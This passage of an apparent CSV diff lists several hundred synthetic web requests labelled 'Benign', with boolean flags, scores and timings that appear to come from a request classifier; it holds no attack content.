+Benign #289,POST /form data=34,True,0.8199890491343497,False,134.881
+Benign #290,GET /search?q=RGiOXDwQdVMsudIOm,False,0.17001095086565038,False,128.487
+Benign #291,GET /services.html,True,0.7199890491343497,False,131.243
+Benign #292,POST /form data=87,True,0.8199890491343497,False,135.677
+Benign #293,POST /form data=3,True,0.8799890491343496,False,151.772
+Benign #294,POST /api/users/295,True,0.6749890491343497,False,137.918
+Benign #295,POST /form data=26,True,0.8199890491343497,False,171.052
+Benign #296,GET /search?q=kvNRpjjv,True,0.7199890491343497,False,161.846
+Benign #297,GET /search?q=geuOyMC,True,0.7199890491343497,False,163.033
+Benign #298,GET /contact.html,True,0.7849890491343496,False,152.869
+Benign #299,POST /api/users/768,True,0.6749890491343497,False,131.922
+Benign #300,GET /home.html,True,0.7949890491343496,False,157.367
+Benign #301,POST /api/users/966,True,0.7349890491343496,False,154.945
+Benign #302,POST /form data=4,True,0.8799890491343496,False,148.257
+Benign #303,GET /search?q=DBYLzqN,True,0.7199890491343497,False,130.438
+Benign #304,GET /services.html,True,0.7199890491343497,False,141.177
+Benign #305,POST /api/users/175,True,0.6749890491343497,False,146.914
+Benign #306,GET /search?q=nbcRhGMQTVOWSrLv,False,0.16501095086565037,False,135.568
+Benign #307,POST /form data=71,True,0.8199890491343497,False,143.232
+Benign #308,POST /form data=13,True,0.8199890491343497,False,137.12
+Benign #309,POST /api/users/415,True,0.6749890491343497,False,131.31
+Benign #310,POST /api/users/33,True,0.7449890491343496,False,137.221
+Benign #311,GET /search?q=ohK VQJAiMBpiN,False,0.17001095086565038,False,179.805
+Benign #312,GET /search?q=kBObYTVEFb pq,False,0.17001095086565038,False,157.097
+Benign #313,GET /search?q=frsfZIQUHC,False,0.17001095086565038,False,155.997
+Benign #314,POST /form data=40,True,0.8199890491343497,False,158.725
+Benign #315,POST /form data=91,True,0.8199890491343497,False,160.07
+Benign #316,POST /form data=88,True,0.8849890491343497,False,135.337
+Benign #317,POST /form data=33,True,0.8849890491343497,False,159.541
+Benign #318,GET /search?q=gessMTGbDmYENkCVU,False,0.17001095086565038,False,153.573
+Benign #319,POST /api/users/501,True,0.6749890491343497,False,146.874
+Benign #320,POST /form data=12,True,0.8199890491343497,False,141.16
+Benign #321,GET /search?q=ghIMCwsDmqpSsEy,False,0.16501095086565037,False,141.218
+Benign #322,POST /form data=41,True,0.8199890491343497,False,139.35
+Benign #323,POST /form data=4,True,0.8799890491343496,False,131.037
+Benign #324,GET /home.html,True,0.7949890491343496,False,134.636
+Benign #325,GET /search?q=dns Kk rTqJsrSbPl,False,0.17001095086565038,False,144.44
+Benign #326,GET /products.html,True,0.7149890491343497,False,150.812
+Benign #327,GET /contact.html,True,0.7849890491343496,False,140.323
+Benign #328,POST /form data=57,True,0.8199890491343497,False,124.322
+Benign #329,POST /api/users/580,True,0.6749890491343497,False,135.97
+Benign #330,GET /search?q=suPRRsQKixT,False,0.17501095086565036,False,130.097
+Benign #331,GET /search?q=j ShwSjLcSXXu,False,0.18501095086565036,False,136.053
+Benign #332,GET /search?q=lnVcv aouUlMgMqPxmLo,False,0.16501095086565037,False,138.804
+Benign #333,GET /search?q=oBMS RQtqxHfHQ,False,0.17001095086565038,False,132.305
+Benign #334,GET /contact.html,True,0.7849890491343496,False,131.699
+Benign #335,GET /contact.html,True,0.7849890491343496,False,139.953
+Benign #336,POST /form data=35,True,0.8199890491343497,False,125.418
+Benign #337,GET /services.html,True,0.7199890491343497,False,123.486
+Benign #338,POST /api/users/836,True,0.6749890491343497,False,104.538
+Benign #339,POST /form data=43,True,0.8199890491343497,False,135.321
+Benign #340,GET /contact.html,True,0.7849890491343496,False,120.874
+Benign #341,POST /api/users/703,True,0.6749890491343497,False,138.923
+Benign #342,GET /search?q=RemyRtoSFJMcNMHnekip,False,0.16501095086565037,False,140.581
+Benign #343,GET /search?q=CgmNRJQHHtVNQ,False,0.17001095086565038,False,140.549
+Benign #344,GET /about.html,True,0.7599890491343497,False,131.168
+Benign #345,POST /form data=61,True,0.8199890491343497,False,142.588
+Benign #346,GET /products.html,True,0.7149890491343497,False,131.052
+Benign #347,GET /services.html,True,0.7199890491343497,False,124.82
+Benign #348,GET /search?q=EhNDfusHYNUo uUblqA,False,0.16501095086565037,False,142.442
+Benign #349,GET /products.html,True,0.7149890491343497,False,154.683
+Benign #350,POST /api/users/141,True,0.7349890491343496,False,142.945
+Benign #351,POST /form data=26,True,0.8199890491343497,False,132.508
+Benign #352,POST /api/users/632,True,0.6749890491343497,False,162.134
+Benign #353,GET /search?q=YqdbbE,True,0.7499890491343497,False,151.214
+Benign #354,POST /api/users/707,True,0.7349890491343496,False,147.109
+Benign #355,POST /form data=85,True,0.8199890491343497,False,155.397
+Benign #356,POST /form data=58,True,0.8199890491343497,False,149.973
+Benign #357,POST /api/users/657,True,0.6749890491343497,False,146.496
+Benign #358,GET /search?q= QaHmymCeDmnM ZYJDt,False,0.16501095086565037,False,128.99
+Benign #359,POST /api/users/504,True,0.6749890491343497,False,139.812
+Benign #360,POST /form data=91,True,0.8199890491343497,False,146.079
+Benign #361,POST /api/users/113,True,0.7349890491343496,False,137.889
+Benign #362,POST /form data=14,True,0.8199890491343497,False,144.385
+Benign #363,GET /search?q=FcFZlWparoTSgy VVPIo,False,0.16501095086565037,False,160.047
+Benign #364,POST /form data=57,True,0.8199890491343497,False,127.19
+Benign #365,POST /form data=11,True,0.8849890491343497,False,190.738
+Benign #366,POST /api/users/548,True,0.6749890491343497,False,140.473
+Benign #367,POST /api/users/389,True,0.6749890491343497,False,135.306
+Benign #368,GET /search?q=XLUMVrBwNnpDvGUteVi,False,0.16501095086565037,False,144.27
+Benign #369,POST /form data=18,True,0.8199890491343497,False,142.454
+Benign #370,POST /api/users/866,True,0.7349890491343496,False,147.169
+Benign #371,GET /products.html,True,0.7149890491343497,False,134.502
+Benign #372,POST /form data=28,True,0.8199890491343497,False,125.265
+Benign #373,GET /search?q=RjyMBcbMPwFqxLCO,False,0.16501095086565037,False,136.365
+Benign #374,GET /search?q=CfuYY,True,0.7499890491343497,False,137.033
+Benign #375,POST /api/users/927,True,0.6749890491343497,False,137.765
+Benign #376,POST /form data=41,True,0.8199890491343497,False,132.849
+Benign #377,POST /api/users/534,True,0.6749890491343497,False,136.648
+Benign #378,GET /home.html,True,0.7949890491343496,False,131.897
+Benign #379,GET /home.html,True,0.7949890491343496,False,148.782
+Benign #380,POST /form data=46,True,0.8199890491343497,False,141.825
+Benign #381,POST /api/users/122,True,0.7349890491343496,False,145.615
+Benign #382,GET /search?q= EtQiPjzEotsPhdT,False,0.16501095086565037,False,139.821
+Benign #383,POST /form data=51,True,0.8199890491343497,False,135.123
+Benign #384,POST /api/users/377,True,0.7349890491343496,False,126.195
+Benign #385,GET /search?q=IBOJoMU,True,0.7149890491343497,False,134.768
+Benign #386,POST /api/users/565,True,0.7349890491343496,False,126.584
+Benign #387,GET /contact.html,True,0.7849890491343496,False,127.197
+Benign #388,GET /products.html,True,0.7149890491343497,False,105.589
+Benign #389,GET /contact.html,True,0.7849890491343496,False,107.666
+Benign #390,POST /form data=56,True,0.8199890491343497,False,110.221
+Benign #391,POST /form data=7,True,0.8799890491343496,False,90.452
+Benign #392,POST /api/users/166,True,0.7349890491343496,False,102.308
+Benign #393,POST /api/users/978,True,0.6749890491343497,False,103.589
+Benign #394,POST /api/users/595,True,0.7349890491343496,False,98.527
+Benign #395,GET /search?q=lm NKZCBBMcePYu ,False,0.16501095086565037,False,102.032
+Benign #396,GET /contact.html,True,0.7849890491343496,False,120.044
+Benign #397,POST /api/users/157,True,0.6749890491343497,False,104.453
+Benign #398,GET /home.html,True,0.7949890491343496,False,108.021
+Benign #399,POST /form data=31,True,0.8199890491343497,False,90.732
+Benign #400,GET /search?q=RhrClXcqqzk,False,0.18501095086565036,False,86.528
+Benign #401,POST /api/users/355,True,0.7349890491343496,False,83.63
+Benign #402,POST /form data=55,True,0.8849890491343497,False,79.604
+Benign #403,GET /about.html,True,0.7599890491343497,False,84.586
+Benign #404,POST /form data=64,True,0.8199890491343497,False,89.201
+Benign #405,GET /contact.html,True,0.7849890491343496,False,80.134
+Benign #406,GET /products.html,True,0.7149890491343497,False,181.004
+Benign #407,GET /search?q=YdUftYnqejlm,False,0.17001095086565038,False,89.15
+Benign #408,GET /search?q=HBMEiaCEjoNkt,False,0.17001095086565038,False,86.083
+Benign #409,GET /services.html,True,0.7199890491343497,False,100.531
+Benign #410,POST /form data=60,True,0.8199890491343497,False,94.434
+Benign #411,POST /form data=73,True,0.8199890491343497,False,104.779
+Benign #412,GET /about.html,True,0.7599890491343497,False,94.704
+Benign #413,POST /api/users/770,True,0.7349890491343496,False,85.484
+Benign #414,GET /search?q=nEzot,True,0.7499890491343497,False,85.603
+Benign #415,GET /search?q=gqUvuOZyySGeWXK,False,0.16501095086565037,False,106.856
+Benign #416,POST /form data=71,True,0.8199890491343497,False,167.719
+Benign #417,GET /search?q=xhMoV,True,0.7499890491343497,False,193.104
+Benign #418,POST /form data=15,True,0.8199890491343497,False,176.527
+Benign #419,GET /search?q=A qUEfRcHcmWjJwF,False,0.16501095086565037,False,142.384
+Benign #420,GET /search?q=EobnjY,True,0.7499890491343497,False,134.244
+Benign #421,POST /form data=17,True,0.8199890491343497,False,134.933
+Benign #422,POST /form data=99,True,0.8849890491343497,False,134.776
+Benign #423,POST /api/users/421,True,0.6749890491343497,False,139.637
+Benign #424,GET /search?q=BLtueuZQBZQJKOZH,False,0.16501095086565037,False,137.849
+Benign #425,POST /api/users/1000,True,0.7399890491343497,False,113.297
+Benign #426,GET /search?q=zurANULCZMsLdY,False,0.17001095086565038,False,126.453
+Benign #427,GET /products.html,True,0.7149890491343497,False,129.582
+Benign #428,POST /form data=47,True,0.8199890491343497,False,136.586
+Benign #429,GET /home.html,True,0.7949890491343496,False,133.399
+Benign #430,GET /search?q=tZbVhMWRAZ PnMZkfW,False,0.17001095086565038,False,122.946
+Benign #431,POST /api/users/991,True,0.7349890491343496,False,129.203
+Benign #432,POST /api/users/52,True,0.7349890491343496,False,121.397
+Benign #433,GET /contact.html,True,0.7849890491343496,False,129.198
+Benign #434,POST /form data=23,True,0.8199890491343497,False,135.304
+Benign #435,POST /api/users/577,True,0.7349890491343496,False,137.263
+Benign #436,POST /api/users/231,True,0.6749890491343497,False,157.232
+Benign #437,POST /form data=15,True,0.8199890491343497,False,173.835
+Benign #438,POST /api/users/225,True,0.7349890491343496,False,173.089
+Benign #439,GET /products.html,True,0.7149890491343497,False,135.613
+Benign #440,POST /form data=90,True,0.8199890491343497,False,172.663
+Benign #441,GET /search?q=UNtm aInOeOItnhQ,False,0.16501095086565037,False,144.61
+Benign #442,GET /search?q= nANtbUwIfKPE,False,0.17001095086565038,False,161.011
+Benign #443,GET /products.html,True,0.7149890491343497,False,143.397
+Benign #444,POST /form data=48,True,0.8199890491343497,False,138.052
+Benign #445,POST /form data=26,True,0.8199890491343497,False,163.669
+Benign #446,GET /products.html,True,0.7149890491343497,False,144.235
+Benign #447,POST /api/users/783,True,0.6749890491343497,False,134.828
+Benign #448,POST /form data=50,True,0.8199890491343497,False,124.137
+Benign #449,GET /search?q=pfiUGI,True,0.7499890491343497,False,138.571
+Benign #450,GET /search?q=upiHhlCqbFtlnfyHb,False,0.17001095086565038,False,141.914
+Benign #451,GET /about.html,True,0.7599890491343497,False,143.864
+Benign #452,POST /api/users/348,True,0.6749890491343497,False,145.822
+Benign #453,GET /services.html,True,0.7199890491343497,False,142.929
+Benign #454,POST /form data=34,True,0.8199890491343497,False,121.524
+Benign #455,POST /form data=43,True,0.8199890491343497,False,140.192
+Benign #456,POST /form data=38,True,0.8199890491343497,False,164.724
+Benign #457,GET /about.html,True,0.7599890491343497,False,130.037
+Benign #458,POST /form data=78,True,0.8199890491343497,False,178.49
+Benign #459,GET /search?q=hDXdzy YyztGzEOHWgQ,False,0.16501095086565037,False,151.086
+Benign #460,GET /search?q=kIAERdkfibtopST,False,0.16501095086565037,False,178.596
+Benign #461,GET /search?q=vIKcDXqQOskY,False,0.17001095086565038,False,142.232
+Benign #462,POST /api/users/674,True,0.6749890491343497,False,159.945
+Benign #463,POST /form data=84,True,0.8199890491343497,False,168.22
+Benign #464,GET /search?q=vAjenOCsFjtDQleSLjW,False,0.16501095086565037,False,163.008
+Benign #465,POST /form data=52,True,0.8199890491343497,False,167.69
+Benign #466,GET /search?q=xPAlAZ,True,0.7499890491343497,False,176.864
+Benign #467,POST /api/users/621,True,0.6749890491343497,False,147.713
+Benign #468,GET /services.html,True,0.7199890491343497,False,162.442
+Benign #469,POST /api/users/675,True,0.6749890491343497,False,146.361
+Benign #470,POST /form data=88,True,0.8849890491343497,False,152.871
+Benign #471,GET /products.html,True,0.7149890491343497,False,145.893
+Benign #472,POST /form data=78,True,0.8199890491343497,False,153.871
+Benign #473,GET /home.html,True,0.7949890491343496,False,157.719
+Benign #474,POST /form data=37,True,0.8199890491343497,False,172.746
+Benign #475,POST /api/users/366,True,0.7349890491343496,False,140.018
+Benign #476,GET /search?q=rVPCYJqrUQuh ,False,0.17001095086565038,False,139.22
+Benign #477,GET /contact.html,True,0.7849890491343496,False,165.99
+Benign #478,POST /form data=84,True,0.8199890491343497,False,159.7
+Benign #479,GET /contact.html,True,0.7849890491343496,False,158.97
+Benign #480,POST /api/users/994,True,0.7349890491343496,False,143.276
+Benign #481,GET /search?q=vUBuOTYzbZxT,False,0.17001095086565038,False,153.615
+Benign #482,GET /search?q=dmtrK,True,0.7499890491343497,False,158.086
+Benign #483,GET /search?q=e rBiBNrUIfCwZ,False,0.17001095086565038,False,154.557
+Benign #484,GET /search?q=uUvHQbvQWgJGqpnGI,False,0.17001095086565038,False,137.815
+Benign #485,POST /form data=66,True,0.8849890491343497,False,163.965
+Benign #486,GET /products.html,True,0.7149890491343497,False,160.411
+Benign #487,POST /api/users/233,True,0.7349890491343496,False,134.93
+Benign #488,GET /services.html,True,0.7199890491343497,False,127.022
+Benign #489,GET /search?q=eaTwWeBeGsyfzowS,False,0.16501095086565037,False,122.683
+Benign #490,GET /products.html,True,0.7149890491343497,False,119.833
+Benign #491,POST /form data=81,True,0.8199890491343497,False,131.275
+Benign #492,POST /api/users/119,True,0.7349890491343496,False,175.076
+Benign #493,GET /about.html,True,0.7599890491343497,False,166.505
+Benign #494,GET /services.html,True,0.7199890491343497,False,122.839
+Benign #495,GET /search?q=trxRhLWZCQXzBwFMgi,False,0.17001095086565038,False,133.954
+Benign #496,GET /services.html,True,0.7199890491343497,False,139.038
+Benign #497,GET /about.html,True,0.7599890491343497,False,129.08
+Benign #498,POST /form data=34,True,0.8199890491343497,False,140.754
+Benign #499,POST /form data=25,True,0.8199890491343497,False,137.562
+Benign #500,POST /form data=36,True,0.8199890491343497,False,145.242
+Benign #501,POST /form data=88,True,0.8849890491343497,False,201.877
+Benign #502,GET /search?q=lqZHtWAZ,True,0.7199890491343497,False,183.325
+Benign #503,GET /search?q=rxkjmyuMLwII,False,0.17001095086565038,False,156.376
+Benign #504,POST /form data=76,True,0.8199890491343497,False,124.37
+Benign #505,GET /home.html,True,0.7949890491343496,False,128.812
+Benign #506,POST /api/users/603,True,0.6749890491343497,False,168.801
+Benign #507,GET /search?q=teLSjzQorGrWGoMcE,False,0.17001095086565038,False,125.021
+Benign #508,POST /api/users/88,True,0.7449890491343496,False,146.007
+Benign #509,POST /form data=90,True,0.8199890491343497,False,149.833
+Benign #510,POST /api/users/707,True,0.7349890491343496,False,143.049
+Benign #511,POST /api/users/224,True,0.7349890491343496,False,126.01
+Benign #512,GET /contact.html,True,0.7849890491343496,False,139.075
+Benign #513,POST /form data=21,True,0.8199890491343497,False,139.654
+Benign #514,GET /home.html,True,0.7949890491343496,False,134.654
+Benign #515,POST /api/users/954,True,0.6749890491343497,False,136.83
+Benign #516,POST /form data=36,True,0.8199890491343497,False,142.546
+Benign #517,POST /form data=11,True,0.8849890491343497,False,140.275
+Benign #518,GET /services.html,True,0.7199890491343497,False,154.395
+Benign #519,POST /form data=83,True,0.8199890491343497,False,163.919
+Benign #520,GET /products.html,True,0.7149890491343497,False,212.97
+Benign #521,GET /search?q=gGntdLO,True,0.7199890491343497,False,144.494
+Benign #522,GET /about.html,True,0.7599890491343497,False,136.096
+Benign #523,GET /search?q=HGxzKbwShmBxfYEihnh,False,0.16501095086565037,False,145.131
+Benign #524,GET /home.html,True,0.7949890491343496,False,141.811
+Benign #525,GET /search?q=TGGkSMk,True,0.7249890491343497,False,174.309
+Benign #526,GET /search?q=DiVWdEtFPnXxAcEVssmI,False,0.16501095086565037,False,162.2
+Benign #527,POST /api/users/599,True,0.7349890491343496,False,168.242
+Benign #528,POST /form data=25,True,0.8199890491343497,False,164.351
+Benign #529,GET /products.html,True,0.7149890491343497,False,156.628
+Benign #530,GET /search?q=rHXjXibsg,True,0.7199890491343497,False,140.931
+Benign #531,POST /api/users/283,True,0.6749890491343497,False,138.798
+Benign #532,POST /form data=48,True,0.8199890491343497,False,169.258
+Benign #533,POST /api/users/462,True,0.6749890491343497,False,148.632
+Benign #534,GET /products.html,True,0.7149890491343497,False,161.068
+Benign #535,GET /search?q=JPnEpLPZG  StjDdmY,False,0.17001095086565038,False,173.298
+Benign #536,POST /form data=37,True,0.8199890491343497,False,166.289
+Benign #537,GET /products.html,True,0.7149890491343497,False,150.999
+Benign #538,POST /form data=15,True,0.8199890491343497,False,150.347
+Benign #539,POST /api/users/469,True,0.6749890491343497,False,146.695
+Benign #540,POST /form data=14,True,0.8199890491343497,False,147.533
+Benign #541,POST /form data=46,True,0.8199890491343497,False,131.833
+Benign #542,GET /services.html,True,0.7199890491343497,False,138.352
+Benign #543,POST /form data=55,True,0.8849890491343497,False,151.591
+Benign #544,GET /search?q=SkbQexWFZg,False,0.17001095086565038,False,152.816
+Benign #545,GET /search?q=dFcPBeM,True,0.7249890491343497,False,150.625
+Benign #546,POST /api/users/692,True,0.6749890491343497,False,147.211
+Benign #547,POST /form data=72,True,0.8199890491343497,False,173.187
+Benign #548,POST /api/users/7,True,0.7449890491343496,False,173.812
+Benign #549,GET /search?q=NRFqGGK DbeFwNOb,False,0.16501095086565037,False,145.207
+Benign #550,POST /form data=89,True,0.8199890491343497,False,134.66
+Benign #551,POST /api/users/185,True,0.6749890491343497,False,165.802
+Benign #552,GET /home.html,True,0.7949890491343496,False,149.378
+Benign #553,POST /api/users/453,True,0.6749890491343497,False,133.565
+Benign #554,POST /api/users/921,True,0.6749890491343497,False,149.525
+Benign #555,POST /api/users/440,True,0.7349890491343496,False,147.31
+Benign #556,POST /api/users/424,True,0.7349890491343496,False,155.351
+Benign #557,POST /api/users/485,True,0.6749890491343497,False,136.528
+Benign #558,GET /contact.html,True,0.7849890491343496,False,140.153
+Benign #559,GET /home.html,True,0.7949890491343496,False,139.741
+Benign #560,GET /home.html,True,0.7949890491343496,False,154.36
+Benign #561,GET /search?q=WJNpGfvnLNOicAwVqlr,False,0.16501095086565037,False,162.975
+Benign #562,POST /api/users/115,True,0.7349890491343496,False,133.291
+Benign #563,POST /form data=16,True,0.8199890491343497,False,163.304
+Benign #564,GET /home.html,True,0.7949890491343496,False,135.567
+Benign #565,POST /api/users/805,True,0.6749890491343497,False,163.736
+Benign #566,GET /search?q=wkgVBUjhlCpprsEVCk,False,0.17001095086565038,False,172.901
+Benign #567,POST /form data=17,True,0.8199890491343497,False,149.73
+Benign #568,GET /search?q=CYwRhD,True,0.7499890491343497,False,156.622
+Benign #569,GET /search?q=XXrsjGcWIFWR QzmSAd,False,0.16501095086565037,False,206.097
+Benign #570,POST /api/users/279,True,0.6749890491343497,False,129.991
+Benign #571,POST /form data=31,True,0.8199890491343497,False,137.718
+Benign #572,GET /products.html,True,0.7149890491343497,False,154.83
+Benign #573,POST /form data=22,True,0.8849890491343497,False,140.419
+Benign #574,POST /form data=81,True,0.8199890491343497,False,153.412
+Benign #575,GET /services.html,True,0.7199890491343497,False,139.648
+Benign #576,GET /services.html,True,0.7199890491343497,False,134.989
+Benign #577,GET /search?q=PlTWaT,True,0.7499890491343497,False,139.237
+Benign #578,POST /api/users/522,True,0.7349890491343496,False,146.34
+Benign #579,GET /products.html,True,0.7149890491343497,False,135.929
+Benign #580,GET /products.html,True,0.7149890491343497,False,149.23
+Benign #581,GET /home.html,True,0.7949890491343496,False,142.946
+Benign #582,GET /search?q=BSzCONtVWKjGQeFYMiB,False,0.16501095086565037,False,132.664
+Benign #583,GET /services.html,True,0.7199890491343497,False,200.966
+Benign #584,GET /search?q=VEhoMWOcL,True,0.7199890491343497,False,173.332
+Benign #585,POST /api/users/838,True,0.7349890491343496,False,180.226
+Benign #586,POST /form data=29,True,0.8199890491343497,False,164.405
+Benign #587,GET /search?q=eXjjjZp,True,0.7249890491343497,False,147.439
+Benign #588,POST /form data=66,True,0.8849890491343497,False,157.723
+Benign #589,POST /api/users/282,True,0.7349890491343496,False,150.021
+Benign #590,GET /services.html,True,0.7199890491343497,False,152.101
+Benign #591,GET /about.html,True,0.7599890491343497,False,171.659
+Benign #592,POST /form data=90,True,0.8199890491343497,False,161.069
+Benign #593,GET /services.html,True,0.7199890491343497,False,230.936
+Benign #594,POST /api/users/561,True,0.6749890491343497,False,138.277
+Benign #595,GET /search?q=QyfieOsqTPXdZCecJYUr,False,0.16501095086565037,False,141.866
+Benign #596,GET /products.html,True,0.7149890491343497,False,150.177
+Benign #597,GET /search?q=GNsPIcA,True,0.7249890491343497,False,140.131
+Benign #598,POST /form data=75,True,0.8199890491343497,False,162.123
+Benign #599,POST /form data=14,True,0.8199890491343497,False,136.056
+Benign #600,POST /form data=48,True,0.8199890491343497,False,145.525
+Benign #601,GET /services.html,True,0.7199890491343497,False,153.31
+Benign #602,POST /api/users/610,True,0.6749890491343497,False,139.391
+Benign #603,POST /api/users/819,True,0.6749890491343497,False,148.934
+Benign #604,GET /contact.html,True,0.7849890491343496,False,136.27
+Benign #605,GET /search?q=twlKNuuoNZdarumOxNTG,False,0.16501095086565037,False,143.011
+Benign #606,GET /home.html,True,0.7949890491343496,False,121.905
+Benign #607,GET /search?q=YuIxVDsbcrb,False,0.17001095086565038,False,121.085
+Benign #608,GET /home.html,True,0.7949890491343496,False,98.216
+Benign #609,POST /form data=5,True,0.8799890491343496,False,123.317
+Benign #610,GET /home.html,True,0.7949890491343496,False,88.095
+Benign #611,GET /home.html,True,0.7949890491343496,False,107.397
+Benign #612,POST /form data=78,True,0.8199890491343497,False,120.151
+Benign #613,GET /products.html,True,0.7149890491343497,False,127.176
+Benign #614,POST /api/users/400,True,0.7349890491343496,False,143.906
+Benign #615,POST /api/users/666,True,0.7499890491343497,False,147.342
+Benign #616,POST /form data=34,True,0.8199890491343497,False,141.317
+Benign #617,POST /form data=13,True,0.8199890491343497,False,157.219
+Benign #618,POST /form data=90,True,0.8199890491343497,False,142.716
+Benign #619,POST /api/users/271,True,0.6749890491343497,False,135.535
+Benign #620,GET /search?q=QVvXSzEApmnznKVzl,False,0.17001095086565038,False,132.625
+Benign #621,POST /api/users/670,True,0.6749890491343497,False,150.072
+Benign #622,POST /api/users/444,True,0.7499890491343497,False,136.745
+Benign #623,GET /services.html,True,0.7199890491343497,False,125.254
+Benign #624,GET /services.html,True,0.7199890491343497,False,135.134
+Benign #625,GET /services.html,True,0.7199890491343497,False,125.711
+Benign #626,GET /search?q=FJTveAcgkHqyZznaMSAP,False,0.16501095086565037,False,176.528
+Benign #627,GET /about.html,True,0.7599890491343497,False,110.536
+Benign #628,GET /search?q=idwkj,True,0.7449890491343496,False,123.851
+Benign #629,GET /home.html,True,0.7949890491343496,False,117.057
+Benign #630,POST /api/users/144,True,0.7349890491343496,False,109.487
+Benign #631,POST /form data=44,True,0.8849890491343497,False,120.681
+Benign #632,POST /form data=56,True,0.8199890491343497,False,129.517
+Benign #633,GET /search?q=FpfBYkUEZMfCtbSPwop,False,0.16501095086565037,False,147.66
+Benign #634,POST /api/users/402,True,0.6749890491343497,False,132.518
+Benign #635,GET /search?q=OiMoXkksyHx Jq,False,0.17001095086565038,False,145.72
+Benign #636,GET /services.html,True,0.7199890491343497,False,132.765
+Benign #637,GET /search?q=kIBvbnZUWSJ,False,0.17001095086565038,False,145.181
+Benign #638,GET /search?q=nDRO wRXWElmDHKfnTy,False,0.16501095086565037,False,140.713
+Benign #639,POST /form data=36,True,0.8199890491343497,False,126.2
+Benign #640,GET /search?q=yrZSuvAjYI,False,0.17001095086565038,False,131.473
+Benign #641,POST /api/users/731,True,0.6749890491343497,False,136.681
+Benign #642,POST /api/users/615,True,0.6749890491343497,False,136.749
+Benign #643,POST /api/users/405,True,0.6749890491343497,False,117.813
+Benign #644,GET /products.html,True,0.7149890491343497,False,119.207
+Benign #645,POST /api/users/138,True,0.6749890491343497,False,120.031
+Benign #646,POST /form data=25,True,0.8199890491343497,False,119.907
+Benign #647,GET /contact.html,True,0.7849890491343496,False,145.903
+Benign #648,GET /search?q=UCIXfqhiYlMHtR,False,0.17001095086565038,False,173.666
+Benign #649,POST /api/users/837,True,0.6749890491343497,False,152.569
+Benign #650,GET /about.html,True,0.7599890491343497,False,140.727
+Benign #651,GET /home.html,True,0.7949890491343496,False,134.755
+Benign #652,GET /contact.html,True,0.7849890491343496,False,172.212
+Benign #653,GET /search?q=hseql,True,0.8149890491343497,False,153.351
+Benign #654,POST /form data=3,True,0.8799890491343496,False,192.842
+Benign #655,GET /search?q=OIWqEoNwC,True,0.7149890491343497,False,174.861
+Benign #656,POST /api/users/755,True,0.7349890491343496,False,142.934
+Benign #657,GET /services.html,True,0.7199890491343497,False,139.244
+Benign #658,POST /api/users/828,True,0.7349890491343496,False,142.386
+Benign #659,GET /about.html,True,0.7599890491343497,False,144.703
+Benign #660,POST /api/users/868,True,0.7349890491343496,False,168.215
+Benign #661,GET /services.html,True,0.7199890491343497,False,174.029
+Benign #662,GET /search?q=lWxyTKqqNmsmoF,False,0.17001095086565038,False,177.214
+Benign #663,POST /form data=44,True,0.8849890491343497,False,176.299
+Benign #664,GET /home.html,True,0.7949890491343496,False,176.437
+Benign #665,GET /search?q=mgwFprc vWNNNFipnJTE,False,0.16501095086565037,False,162.577
+Benign #666,POST /form data=95,True,0.8199890491343497,False,155.623
+Benign #667,GET /home.html,True,0.7949890491343496,False,147.934
+Benign #668,GET /search?q=BSIVURGwSEEYD,False,0.17001095086565038,False,125.809
+Benign #669,GET /products.html,True,0.7149890491343497,False,161.137
+Benign #670,POST /api/users/396,True,0.6749890491343497,False,146.534
+Benign #671,GET /contact.html,True,0.7849890491343496,False,139.636
+Benign #672,GET /services.html,True,0.7199890491343497,False,132.517
+Benign #673,POST /api/users/478,True,0.6749890491343497,False,142.323
+Benign #674,GET /about.html,True,0.7599890491343497,False,125.358
+Benign #675,GET /search?q=nLDVPuGhZHPyTAnpY,False,0.17001095086565038,False,140.86
+Benign #676,POST /api/users/681,True,0.6749890491343497,False,144.377
+Benign #677,GET /about.html,True,0.7599890491343497,False,145.535
+Benign #678,GET /products.html,True,0.7149890491343497,False,133.527
+Benign #679,GET /search?q=AcNYMbyUiQsMX Wfti,False,0.17001095086565038,False,129.957
+Benign #680,GET /products.html,True,0.7149890491343497,False,137.671
+Benign #681,GET /home.html,True,0.7949890491343496,False,148.066
+Benign #682,POST /form data=90,True,0.8199890491343497,False,139.123
+Benign #683,GET /services.html,True,0.7199890491343497,False,189.439
+Benign #684,GET /search?q=IZGxb JUq,True,0.7199890491343497,False,139.757
+Benign #685,GET /search?q=ERrDlpVusw,False,0.17001095086565038,False,177.481
+Benign #686,GET /search?q=ozPLRW,True,0.7399890491343497,False,135.061
+Benign #687,POST /api/users/399,True,0.7349890491343496,False,172.206
+Benign #688,GET /search?q=Umi h qcyONlhIQXicFd,False,0.16501095086565037,False,168.657
+Benign #689,GET /search?q=ARrisB,True,0.7499890491343497,False,164.306
+Benign #690,GET /search?q=qvfL Tb,True,0.7249890491343497,False,133.249
+Benign #691,POST /api/users/479,True,0.6749890491343497,False,168.576
+Benign #692,GET /about.html,True,0.7599890491343497,False,156.865
+Benign #693,POST /form data=56,True,0.8199890491343497,False,156.202
+Benign #694,POST /form data=96,True,0.8199890491343497,False,142.032
+Benign #695,POST /form data=82,True,0.8199890491343497,False,173.684
+Benign #696,GET /about.html,True,0.7599890491343497,False,149.202
+Benign #697,GET /about.html,True,0.7599890491343497,False,161.704
+Benign #698,GET /services.html,True,0.7199890491343497,False,143.639
+Benign #699,GET /search?q=NGLITFZCSgofpphpKyY,False,0.16501095086565037,False,174.754
+Benign #700,GET /search?q=fcOhNTvDGiHOL,False,0.17001095086565038,False,171.929
+Benign #701,POST /api/users/306,True,0.6749890491343497,False,124.835
+Benign #702,POST /form data=43,True,0.8199890491343497,False,183.643
+Benign #703,GET /services.html,True,0.7199890491343497,False,176.271
+Benign #704,POST /form data=15,True,0.8199890491343497,False,177.422
+Benign #705,POST /api/users/660,True,0.7349890491343496,False,135.914
+Benign #706,POST /api/users/884,True,0.7349890491343496,False,122.017
+Benign #707,POST /api/users/282,True,0.7349890491343496,False,135.308
+Benign #708,POST /form data=75,True,0.8199890491343497,False,157.151
+Benign #709,POST /form data=72,True,0.8199890491343497,False,155.469
+Benign #710,GET /search?q=zDXYgjASCYGrxnp,False,0.16501095086565037,False,138.316
+Benign #711,GET /home.html,True,0.7949890491343496,False,162.818
+Benign #712,GET /services.html,True,0.7199890491343497,False,193.87
+Benign #713,GET /search?q=okdDWkrSEAcdTHCDpqkG,False,0.16501095086565037,False,144.966
+Benign #714,GET /contact.html,True,0.7849890491343496,False,147.998
+Benign #715,POST /form data=13,True,0.8199890491343497,False,153.071
+Benign #716,GET /search?q=qj SgZvvTI,False,0.18001095086565036,False,141.862
